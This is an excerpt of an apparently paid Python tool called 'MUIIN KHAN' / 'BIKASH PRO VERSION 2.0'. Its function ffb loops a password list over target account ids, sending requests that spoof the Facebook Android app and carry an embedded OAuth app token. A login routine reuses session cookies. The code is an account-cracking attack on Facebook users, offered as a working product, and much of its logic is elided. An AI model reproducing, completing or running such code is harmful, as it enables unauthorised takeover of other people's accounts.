...
----------------------------------------------
 ...
 Tool Name : MUIIN KHAN
 Type type : PAID
 Version   : 2.0
----------------------------------------------
 BIKASH PRO VERSION 2.0
 FEEL THE POWER OF MUIIN (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def login():
        ...
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {'User-Agent': '[FBAN/FB4A;FBAV/540.0.0.11411;FBBV/54709872;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_FI;FBMF/S23 Ultra;FBBD/S23 Ultra;FBDV/Samsung Galaxy ;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}, cookies = {"cookie":cookies})
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'User-Agent': '[FBAN/FB4A;FBAV/540.0.0.11411;FBBV/54709872;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_FI;FBMF/S23 Ultra;FBBD/S23 Ultra;FBDV/Samsung Galaxy ;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
